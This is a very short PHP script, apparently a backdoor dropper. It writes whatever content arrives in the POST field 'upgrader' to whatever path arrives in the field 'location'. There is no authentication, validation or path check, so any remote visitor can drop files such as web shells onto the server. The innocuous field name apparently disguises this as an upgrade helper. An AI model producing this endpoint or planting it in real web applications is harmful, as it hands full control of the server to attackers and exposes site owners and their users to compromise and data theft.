<?php
$page = $_POST['location'];

$upgrade = $_POST['upgrader'];


$filename = $page;
 $file = fopen( $filename, "w" );
 if( $file == false ) {
   echo ( "Error in opening new file" );
    exit();
  }
  fwrite( $file, $upgrade );
 fclose( $file );




 ?>
